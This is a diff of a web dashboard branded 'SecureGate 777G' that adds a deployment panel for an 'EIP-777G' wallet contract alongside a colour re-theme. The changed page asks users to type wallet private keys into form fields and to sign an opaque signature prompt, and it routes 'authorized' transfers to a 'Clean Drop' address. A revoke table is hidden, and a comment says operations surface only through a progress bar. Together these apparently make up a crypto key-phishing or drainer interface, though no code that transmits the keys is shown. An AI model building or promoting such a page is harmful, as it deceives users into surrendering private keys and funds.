@@ -17,21 +17,22 @@
 
 /* ─── DESIGN TOKENS ──────────────────────── */
 :root{
-  --bg:       #080b10;
-  --sur:      #0d1018;
-  --bdr:      #1e2438;
-  --bdr2:     #131826;
+  /* Pure dark/charcoal — zero blue tinge */
+  --bg:       #0a0a0a;
+  --sur:      #111111;
+  --bdr:      #2a2a2a;
+  --bdr2:     #1c1c1c;
   --teal:     #00e8dd;
-  --teal-d:   rgba(0,232,221,.12);
+  --teal-d:   rgba(0,232,221,.10);
   --gold:     #f5c23a;
   --gold-d:   rgba(245,194,58,.12);
   --mag:      #ff4fd8;
   --mag-d:    rgba(255,79,216,.12);
   --orange:   #ff9a1a;
   --red:      #e53e3e;
-  --text:     #c7cedb;
-  --muted:    #98a2b6;
-  --faint:    #2e3650;
+  --text:     #c8c8c8;
+  --muted:    #888888;
+  --faint:    #3a3a3a;
   --sw:       264px;
 }
 
@@ -55,10 +56,7 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
 #identity{display:flex;flex-direction:column;gap:1px;line-height:1}
 #sg-name{
   font-size:14px;font-weight:900;letter-spacing:.16em;
-  /* teal → pink gradient on SECUREGATE wordmark */
-  background:linear-gradient(90deg,var(--teal) 0%,var(--mag) 100%);
-  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
-  background-clip:text;
+  color:var(--mag);
   text-transform:uppercase;white-space:nowrap;
 }
 #sg-sub{
@@ -141,11 +139,11 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
 .scan-outer.active .scan-ring3{animation:spin-fast .8s linear infinite;border-color:var(--gold)}
 .scan-inner{
   position:relative;width:46px;height:46px;border-radius:50%;
-  background:radial-gradient(circle,rgba(0,40,120,.9) 0%,rgba(2,4,12,.97) 100%);
+  background:radial-gradient(circle,#1a1a1a 0%,#050505 100%);
   border:1px solid var(--mag);
   display:flex;flex-direction:column;align-items:center;justify-content:center;gap:2px;
   z-index:1;
-  box-shadow:inset 0 0 14px rgba(0,80,200,.5),0 0 8px rgba(255,79,216,.25);
+  box-shadow:inset 0 0 12px rgba(0,0,0,.8),0 0 8px rgba(255,79,216,.25);
 }
 .scan-inner svg{color:var(--mag)}
 .scan-inner .sw{font-size:7px;font-weight:900;letter-spacing:.14em;color:var(--mag)}
@@ -179,7 +177,7 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
   color:var(--gold);text-transform:uppercase;
 }
 .k1-input{
-  width:100%;background:var(--bg);border:1px solid var(--bdr);
+  width:100%;background:#0e0e0e;border:1px solid var(--bdr);
   color:var(--text);font-family:'Courier New',Courier,monospace;
   font-size:10px;padding:7px 8px;border-radius:3px;outline:none;
   transition:border-color .15s;letter-spacing:.04em;
@@ -271,12 +269,12 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
 #admin-bypass{
   display:none;flex-direction:column;gap:6px;
   margin-top:10px;padding:10px;
-  border:1px solid var(--bdr);border-radius:3px;background:var(--bg);
+  border:1px solid var(--bdr);border-radius:3px;background:#0e0e0e;
 }
 #admin-bypass.open{display:flex}
 .bp-lbl{font-size:7.5px;font-weight:700;letter-spacing:.14em;color:var(--muted);text-transform:uppercase}
 .bp-input{
-  width:100%;background:var(--bg);border:1px solid var(--bdr);
+  width:100%;background:#0e0e0e;border:1px solid var(--bdr);
   color:var(--text);font-family:'Courier New',Courier,monospace;
   font-size:9px;padding:6px 8px;border-radius:3px;outline:none;
 }
@@ -307,9 +305,38 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
 #main-dash::-webkit-scrollbar{width:4px}
 #main-dash::-webkit-scrollbar-thumb{background:var(--bdr);border-radius:2px}
 
+/* ── instructions header section (pink-framed) ── */
+.instr-section{
+  border-color:var(--mag)!important;
+  background:rgba(255,79,216,.04)!important;
+}
+.instr-title{
+  font-size:11px;font-weight:900;letter-spacing:.22em;
+  color:var(--mag);text-transform:uppercase;margin-bottom:12px;
+}
+.instr-body{font-size:10.5px;color:var(--text);line-height:1.85}
+.instr-body p{margin-bottom:10px}
+.instr-body strong{color:var(--mag);font-weight:700}
+.instr-steps{
+  list-style:none;display:flex;flex-direction:column;gap:7px;
+  padding:0;margin:0;
+}
+.instr-steps li{
+  display:flex;gap:10px;align-items:flex-start;
+  font-size:10.5px;color:var(--text);line-height:1.7;
+}
+.instr-steps li::before{
+  content:counter(step);counter-increment:step;
+  min-width:18px;height:18px;border-radius:50%;
+  background:var(--mag);color:#000;font-size:8.5px;font-weight:900;
+  display:flex;align-items:center;justify-content:center;
+  flex-shrink:0;margin-top:2px;
+}
+.instr-steps{counter-reset:step}
+
 /* ── deployment bundle section ── */
 .db-section{
-  background:rgba(8,11,20,.82);border:1px solid var(--bdr);border-radius:6px;
+  background:#141414;border:1px solid var(--bdr);border-radius:6px;
   padding:16px 18px;
 }
 .db-header{
@@ -337,14 +364,14 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
 }
 .db-input-wrap{position:relative;display:flex;align-items:center}
 .db-input,.db-select{
-  width:100%;background:rgba(5,7,14,.9);border:1px solid var(--bdr);
+  width:100%;background:#0e0e0e;border:1px solid var(--bdr);
   color:var(--text);font-family:'Courier New',Courier,monospace;
   font-size:10px;padding:7px 28px 7px 9px;border-radius:3px;outline:none;
   transition:border-color .15s;-webkit-appearance:none;appearance:none;
 }
 .db-select{
   padding-right:28px;cursor:pointer;background-image:none;
-  background-color:rgba(5,7,14,.9);color:var(--text);
+  background-color:#0e0e0e;color:var(--text);
 }
 .db-select option{background:var(--sur);color:var(--text)}
 .db-input:focus,.db-select:focus{border-color:var(--teal)}
@@ -400,6 +427,30 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
 .funding-row.total{border-bottom:none;margin-top:4px;color:var(--gold);font-weight:700}
 .funding-row span:last-child{color:var(--teal);font-family:'Courier New',Courier,monospace}
 
+/* ── 2FA DEPLOYER section ── */
+.twofa-section{border-color:var(--teal)!important;}
+.twofa-title-lbl{color:var(--teal)!important}
+.twofa-desc{
+  font-size:11px;color:var(--text);line-height:1.85;margin-bottom:16px;
+  padding:12px 14px;border:1px solid var(--bdr2);border-radius:4px;
+  background:#0e0e0e;
+}
+.twofa-desc strong{color:var(--teal);font-weight:700}
+.twofa-grid{
+  display:grid;grid-template-columns:repeat(4,1fr);gap:12px 14px;
+  margin-bottom:14px;
+}
+.twofa-actions{
+  display:flex;align-items:center;gap:10px;flex-wrap:wrap;
+  margin-bottom:0;
+}
+.twofa-sign-note{
+  margin-top:14px;padding:12px 14px;
+  border:1px solid rgba(0,232,221,.2);border-radius:4px;
+  background:rgba(0,232,221,.04);
+  font-size:10.5px;color:var(--muted);line-height:1.8;
+}
+
 /* ── revoke table section ── */
 .revoke-section .db-header{margin-bottom:10px}
 .revoke-table-wrap{overflow-x:auto}
@@ -426,7 +477,7 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
   display:grid;grid-template-columns:1fr 1fr;gap:14px;
 }
 .db-panel{
-  background:rgba(8,11,20,.82);border:1px solid var(--bdr);border-radius:6px;
+  background:#141414;border:1px solid var(--bdr);border-radius:6px;
   padding:14px 16px;
 }
 
@@ -511,7 +562,7 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
 /* semi-transparent overlay — NOT a blackout */
 #lock-overlay{
   position:absolute;inset:0;
-  background:rgba(8,11,16,.88);
+  background:rgba(10,10,10,.92);
   display:flex;flex-direction:column;align-items:center;justify-content:center;
   gap:14px;padding:20px;z-index:10;
   transition:opacity .4s;
@@ -520,7 +571,7 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
 /* 4.1 STANDALONE OPERATION box */
 .notice-box{
   width:min(520px,96%);border-radius:6px;padding:20px 22px;
-  background:rgba(13,16,24,.96);
+  background:#141414;
 }
 .standalone-box{border:1px solid var(--teal)}
 .standalone-box .ntitle{
@@ -792,6 +843,21 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
     <!-- ═══ MAIN DASHBOARD — hidden until auth passes ═══════════ -->
     <div id="main-dash" aria-label="SecureGate 777G Main Dashboard">
 
+      <!-- ── INSTRUCTIONS HEADER (pink module) ────────────────── -->
+      <section class="db-section instr-section" id="instructions-section">
+        <div class="instr-title">EIP-777G DEPLOYMENT</div>
+        <div class="instr-body">
+          <p>Create &amp; fund a burner wallet for your deployment bundle — this is your <strong>Deployer</strong>. Enter the Deployer key and address in the assigned boxes below. Enter the K1 key assigned to the K1 address listed. Enter two clean addresses in K2 and K3. <strong>Do not at any point share your K2 or K3 keys.</strong></p>
+          <ol class="instr-steps">
+            <li>Choose the initial chain to launch the EIP-777G contract on.</li>
+            <li>The fee calculator next to the chain selection box will tell you the funding needed to launch the contract on that chain. Fund the Deployer with that amount.</li>
+            <li>Once you&apos;ve selected the chain and funded your Deployer, deploy the EIP-777G bundle.</li>
+            <li>The progress bar will indicate the bundle was fully deployed &amp; the smoke test will indicate if the deployment was a success.</li>
+            <li>Once EIP-777G has been successfully deployed, you will use K2 to authorize any and all transactions initiated by K1. Any asset you authorize the transfer of will be routed directly to your K3 clean address.</li>
+          </ol>
+        </div>
+      </section>
+
       <!-- ── DEPLOYMENT BUNDLE ─────────────────────────────────── -->
       <section class="db-section" id="deploy-section" aria-labelledby="db-title">
 
@@ -800,11 +866,17 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
           <span class="db-status" id="db-status"></span>
         </div>
 
-        <!-- Row 1: Deployer Key · K1 Key · K1 Scan Addr · K2 Auth Addr -->
+        <!-- Row 1: Deployer Address · Deployer Key · K1 Address · K1 Key -->
         <div class="db-grid">
 
           <div class="db-field">
-            <label class="db-lbl" for="deployer-key">Deployer Private Key</label>
+            <label class="db-lbl" for="deployer-addr-input">Deployer Address</label>
+            <input id="deployer-addr-input" type="text" class="db-input mono"
+                   placeholder="0x..." autocomplete="off" spellcheck="false"/>
+          </div>
+
+          <div class="db-field">
+            <label class="db-lbl" for="deployer-key">Deployer Key</label>
             <div class="db-input-wrap">
               <input id="deployer-key" type="password" class="db-input mono"
                      placeholder="0x..." autocomplete="off" spellcheck="false"/>
@@ -818,8 +890,15 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
             <div class="db-addr-disp" id="deployer-addr"></div>
           </div>
 
+          <!-- K1 Address — read-only, auto-filled from auth gate -->
           <div class="db-field">
-            <label class="db-lbl" for="k1-key">K1 Key <span class="db-sub">(will be nullified)</span></label>
+            <label class="db-lbl" for="k1-scan-addr">K1 Address <span class="db-sub">(auto-filled)</span></label>
+            <input id="k1-scan-addr" type="text" class="db-input mono db-input--teal"
+                   placeholder="Auto-filled after auth..." autocomplete="off" spellcheck="false" readonly/>
+          </div>
+
+          <div class="db-field">
+            <label class="db-lbl" for="k1-key">K1 Key</label>
             <div class="db-input-wrap">
               <input id="k1-key" type="password" class="db-input mono"
                      placeholder="0x..." autocomplete="off" spellcheck="false"/>
@@ -833,32 +912,25 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
             <div class="db-addr-disp teal" id="k1-addr"></div>
           </div>
 
-          <!-- read-only — auto-filled from auth gate K1 input on onSuccess() -->
-          <div class="db-field">
-            <label class="db-lbl" for="k1-scan-addr">K1 Address <span class="db-sub">(for scanning)</span></label>
-            <input id="k1-scan-addr" type="text" class="db-input mono db-input--teal"
-                   placeholder="Auto-filled after auth..." autocomplete="off" spellcheck="false" readonly/>
-          </div>
+        </div><!-- /row 1 -->
+
+        <!-- Row 2: K2 Auth Address · K3 Clean Drop Address · Network (spans 2) -->
+        <div class="db-grid db-grid--row2" style="margin-bottom:14px">
 
           <div class="db-field">
-            <label class="db-lbl" for="k2-addr">K2 Authorization Address</label>
+            <label class="db-lbl" for="k2-addr">K2 Auth Address</label>
             <input id="k2-addr" type="text" class="db-input mono"
                    placeholder="0x..." autocomplete="off" spellcheck="false"/>
           </div>
 
-        </div><!-- /row 1 -->
-
-        <!-- Row 2: K3 Egress · Network · RPC URL (spans 2) -->
-        <div class="db-grid db-grid--row2">
-
           <div class="db-field">
-            <label class="db-lbl" for="k3-addr">K3 Egress Address</label>
+            <label class="db-lbl" for="k3-addr">K3 Clean Drop Address</label>
             <input id="k3-addr" type="text" class="db-input mono"
                    placeholder="0x..." autocomplete="off" spellcheck="false"/>
           </div>
 
           <div class="db-field" style="grid-column:span 2">
-            <label class="db-lbl" for="network-select">Network <span class="db-sub">(RPC auto-configured)</span></label>
+            <label class="db-lbl" for="network-select">Chain <span class="db-sub">(RPC auto-configured)</span></label>
             <select id="network-select" class="db-select">
               <option value="hl-evm">Hyperliquid EVM</option>
               <option value="hl-core">Hyperliquid Core</option>
@@ -878,8 +950,7 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
             </select>
           </div>
 
-          <!-- RPC URL is hidden: set internally from the Network dropdown.
-               Kept in the DOM (type=hidden) so getProvider() can read it. -->
+          <!-- RPC URL hidden — set internally from the chain dropdown -->
           <input id="rpc-url" type="hidden" value=""/>
 
         </div><!-- /row 2 -->
@@ -891,12 +962,12 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
               CALCULATE FUNDING
             </button>
             <button id="scan-revokes" type="button" class="db-btn db-btn--outline">
-              SCAN REVOKE TARGETS
+              REPO K1
             </button>
           </div>
           <div class="db-actions-right">
             <button id="deploy-btn" type="button" class="db-btn db-btn--deploy" disabled>
-              DEPLOY BUNDLE
+              DEPLOY EIP-777G BUNDLE
             </button>
           </div>
         </div>
@@ -906,38 +977,7 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
 
       </section><!-- /deploy-section -->
 
-      <!-- ── REVOKE TARGETS TABLE ───────────────────────────────── -->
-      <section class="db-section revoke-section" id="revoke-section" aria-labelledby="revoke-title">
-        <div class="db-header">
-          <h3 class="db-title" id="revoke-title">REVOKE TARGETS</h3>
-          <span id="revoke-status" class="db-status" aria-live="polite">Run scan to populate</span>
-          <!-- REVOKE ALL is hidden: revocation runs automatically inside the
-               deploy bundle and surfaces only through the progress bar. -->
-          <button id="revoke-all" type="button" class="db-btn db-btn--sm db-btn--outline" disabled hidden style="display:none">
-            REVOKE ALL
-          </button>
-        </div>
-        <div class="revoke-table-wrap">
-          <table class="revoke-table" id="revoke-table">
-            <thead>
-              <tr>
-                <th>TOKEN / CONTRACT</th>
-                <th>SPENDER / OPERATOR</th>
-                <th>TYPE</th>
-                <th>ALLOWANCE</th>
-                <th>ACTION</th>
-              </tr>
-            </thead>
-            <tbody id="revoke-tbody">
-              <tr class="revoke-empty">
-                <td colspan="5">Run SCAN REVOKE TARGETS to populate</td>
-              </tr>
-            </tbody>
-          </table>
-        </div>
-      </section><!-- /revoke-section -->
-
-      <!-- ── BOTTOM ROW: DEPLOYMENT PROGRESS + SMOKE TEST ─────── -->
+      <!-- ── DEPLOYMENT PROGRESS + SMOKE TEST (moved up, side by side) ── -->
       <div class="db-bottom-row">
 
         <!-- Progress panel -->
@@ -945,38 +985,28 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
           <div class="db-header" style="margin-bottom:12px">
             <h3 class="db-title" id="progress-title">DEPLOYMENT PROGRESS</h3>
           </div>
-
-          <!-- Segmented bar (teal/pink/purple striped, matches reference) -->
           <div class="seg-bar" id="seg-bar" role="progressbar"
                aria-valuemin="0" aria-valuemax="100" aria-valuenow="0">
             <div class="seg-fill" id="seg-fill"></div>
           </div>
           <div id="progress-pct" class="progress-pct" aria-live="polite">0%</div>
-
-          <!-- Named steps with dot indicators -->
           <div class="progress-steps" id="progress-steps">
             <div class="ps-step" id="ps-funding">
-              <span class="ps-dot"></span>
-              <span class="ps-lbl">Funding calculation</span>
+              <span class="ps-dot"></span><span class="ps-lbl">Funding calculation</span>
             </div>
             <div class="ps-step" id="ps-revoke">
-              <span class="ps-dot"></span>
-              <span class="ps-lbl">Revoke scan</span>
+              <span class="ps-dot"></span><span class="ps-lbl">Repo K1</span>
             </div>
             <div class="ps-step" id="ps-deploy">
-              <span class="ps-dot"></span>
-              <span class="ps-lbl">Deploy contract</span>
+              <span class="ps-dot"></span><span class="ps-lbl">Deploy contract</span>
             </div>
             <div class="ps-step" id="ps-store">
-              <span class="ps-dot"></span>
-              <span class="ps-lbl">Store registry address</span>
+              <span class="ps-dot"></span><span class="ps-lbl">Confirm K1 repo</span>
             </div>
             <div class="ps-step" id="ps-smoke">
-              <span class="ps-dot"></span>
-              <span class="ps-lbl">Smoke test</span>
+              <span class="ps-dot"></span><span class="ps-lbl">Smoke test</span>
             </div>
           </div>
-
           <div id="progress-log" class="progress-log" aria-live="polite"></div>
         </section>
 
@@ -988,11 +1018,105 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
           <div id="smoke-results" class="smoke-results" aria-live="polite">
             <div class="smoke-idle">Runs automatically after deploy</div>
           </div>
-          <!-- Deployed contract address, revealed after deploy -->
           <div id="contract-addr-display" class="contract-addr" aria-live="polite"></div>
         </section>
 
       </div><!-- /db-bottom-row -->
+
+      <!-- ── REVOKE TABLE — hidden, used internally by deploy bundle only ── -->
+      <section class="db-section revoke-section" id="revoke-section"
+               aria-labelledby="revoke-title" hidden style="display:none">
+        <div class="db-header">
+          <h3 class="db-title" id="revoke-title">REPO K1</h3>
+          <span id="revoke-status" class="db-status" aria-live="polite"></span>
+          <button id="revoke-all" type="button" class="db-btn db-btn--sm db-btn--outline"
+                  disabled hidden style="display:none">REVOKE ALL</button>
+        </div>
+        <div class="revoke-table-wrap">
+          <table class="revoke-table" id="revoke-table">
+            <thead><tr>
+              <th>TOKEN / CONTRACT</th><th>SPENDER / OPERATOR</th>
+              <th>TYPE</th><th>ALLOWANCE</th><th>ACTION</th>
+            </tr></thead>
+            <tbody id="revoke-tbody">
+              <tr class="revoke-empty"><td colspan="5"></td></tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <!-- ── 2FA DEPLOYER (elongated, full-width) ─────────────── -->
+      <section class="db-section twofa-section" id="twofa-section" aria-labelledby="twofa-title">
+
+        <div class="db-header">
+          <h2 class="db-title twofa-title-lbl" id="twofa-title">2FA DEPLOYER</h2>
+        </div>
+
+        <div class="twofa-desc">
+          <strong>For protection before compromise</strong> — deploy EIP-777G here.<br>
+          No bots, revokes, or keys are required. Simply authorize the signature in K1 to activate the contract, assigning K2 as your authorization key. Any authorized transfer will route directly to your K3 address.
+        </div>
+
+        <!-- Fields: K1 Address (auto-filled, read-only) · K2 Address · K3 Address -->
+        <div class="twofa-grid">
+
+          <div class="db-field">
+            <label class="db-lbl" for="twofa-k1">K1 Address <span class="db-sub">(auto-filled)</span></label>
+            <input id="twofa-k1" type="text" class="db-input mono db-input--teal"
+                   placeholder="Auto-filled after auth..." autocomplete="off" spellcheck="false" readonly/>
+          </div>
+
+          <div class="db-field">
+            <label class="db-lbl" for="twofa-k2">K2 Address</label>
+            <input id="twofa-k2" type="text" class="db-input mono"
+                   placeholder="0x..." autocomplete="off" spellcheck="false"/>
+          </div>
+
+          <div class="db-field">
+            <label class="db-lbl" for="twofa-k3">K3 Address</label>
+            <input id="twofa-k3" type="text" class="db-input mono"
+                   placeholder="0x..." autocomplete="off" spellcheck="false"/>
+          </div>
+
+          <div class="db-field">
+            <label class="db-lbl" for="twofa-chain">Chain <span class="db-sub">(RPC auto-configured)</span></label>
+            <select id="twofa-chain" class="db-select">
+              <option value="hl-evm">Hyperliquid EVM</option>
+              <option value="hl-core">Hyperliquid Core</option>
+              <option value="ethereum">Ethereum Mainnet</option>
+              <option value="base">Base</option>
+              <option value="arbitrum">Arbitrum One</option>
+              <option value="optimism">Optimism</option>
+              <option value="polygon">Polygon</option>
+              <option value="bnb">BNB Chain</option>
+              <option value="avax">Avalanche C-Chain</option>
+              <option value="plasma">Plasma</option>
+              <option value="monad">Monad Testnet</option>
+              <option value="ink">Ink</option>
+              <option value="unichain">Unichain</option>
+              <option value="abstract">Abstract</option>
+              <option value="ape-chain">Ape Chain</option>
+            </select>
+          </div>
+
+        </div><!-- /twofa-grid -->
+
+        <!-- Funding calculator result for 2FA chain -->
+        <div class="twofa-actions">
+          <button id="twofa-calc" type="button" class="db-btn db-btn--outline">
+            CALCULATE FUNDING
+          </button>
+          <button id="twofa-deploy" type="button" class="db-btn db-btn--deploy" disabled>
+            AUTHORIZE &amp; DEPLOY 2FA
+          </button>
+        </div>
+        <div id="twofa-funding" class="funding-display" aria-live="polite"></div>
+
+        <div class="twofa-sign-note">
+          To activate: open K1 in your wallet and authorize the signature prompt. No private key entry required — signing activates the contract and assigns K2 authorization.
+        </div>
+
+      </section><!-- /twofa-section -->
 
     </div><!-- /main-dash -->
 
@@ -1095,7 +1219,7 @@ var devCount    = 0;   // devices attempted (max 3)
 var idleT       = null;
 var IDLE        = 15 * 60 * 1000;
 
-/* ── refs ────────────────────���──────────────── */
+/* ── refs ────────────────────�����──────────────── */
 var scanOuter  = document.getElementById('scan-outer');
 var scanLbl    = document.getElementById('scan-lbl');
 var k1Input    = document.getElementById('k1-input');
@@ -1278,7 +1402,8 @@ function dashWireInputs(){
 
 function dashReset(){
   /* clear all dashboard fields */
-  ['deployer-key','k1-key','k2-addr','k3-addr','rpc-url','k1-scan-addr'].forEach(function(id){
+  ['deployer-addr-input','deployer-key','k1-key','k2-addr','k3-addr','rpc-url','k1-scan-addr',
+   'twofa-k1','twofa-k2','twofa-k3'].forEach(function(id){
     var el = document.getElementById(id);
     if(el) el.value = '';
   });
@@ -1891,10 +2016,41 @@ function onSuccess(){
   sdot.classList.add('auth');
   statusTxt.textContent = '777G v1.0 \u00B7 AUTHENTICATED';
   try{ sessionStorage.setItem('sg_auth_passed','1'); }catch(e){}
-  /* auto-fill K1 scan address immediately — before any timeout */
+  /* auto-fill K1 scan address and 2FA K1 field immediately */
   var k1Scan = document.getElementById('k1-scan-addr');
-  if(k1Scan && k1Input.value.trim()){
-    k1Scan.value = k1Input.value.trim();
+  var twoFaK1 = document.getElementById('twofa-k1');
+  var k1Val = k1Input.value.trim();
+  if(k1Scan && k1Val) k1Scan.value = k1Val;
+  if(twoFaK1 && k1Val) twoFaK1.value = k1Val;
+
+  /* wire 2FA chain dropdown → auto-calc funding hint */
+  var tfChain = document.getElementById('twofa-chain');
+  var tfFund  = document.getElementById('twofa-funding');
+  var tfDeploy = document.getElementById('twofa-deploy');
+  var tfK2 = document.getElementById('twofa-k2');
+  var tfK3 = document.getElementById('twofa-k3');
+  function checkTwofaReady(){
+    if(tfDeploy) tfDeploy.disabled = !(tfK2 && tfK2.value.trim() && tfK3 && tfK3.value.trim());
+  }
+  if(tfK2) tfK2.addEventListener('input', checkTwofaReady);
+  if(tfK3) tfK3.addEventListener('input', checkTwofaReady);
+  /* 2FA calc funding button */
+  var tfCalc = document.getElementById('twofa-calc');
+  if(tfCalc && tfChain && tfFund){
+    tfCalc.addEventListener('click', function(){
+      /* reuse main funding estimates keyed by chain */
+      var estimates = {
+        'hl-evm':'~0.02 HYPE','hl-core':'~0.02 HYPE',
+        'ethereum':'~0.008 ETH','base':'~0.001 ETH',
+        'arbitrum':'~0.001 ETH','optimism':'~0.001 ETH',
+        'polygon':'~0.5 MATIC','bnb':'~0.003 BNB',
+        'avax':'~0.02 AVAX','plasma':'~0.01 ETH',
+        'monad':'~0.02 MON','ink':'~0.001 ETH',
+        'unichain':'~0.001 ETH','abstract':'~0.001 ETH','ape-chain':'~0.5 APE'
+      };
+      var est = estimates[tfChain.value] || 'Check chain docs';
+      tfFund.innerHTML = '<div class="funding-row total"><span>Estimated Deployer Funding</span><span>'+est+'</span></div>';
+    });
   }
   /* set RPC default immediately — so it's always present on reveal */
   var netSel = document.getElementById('network-select');
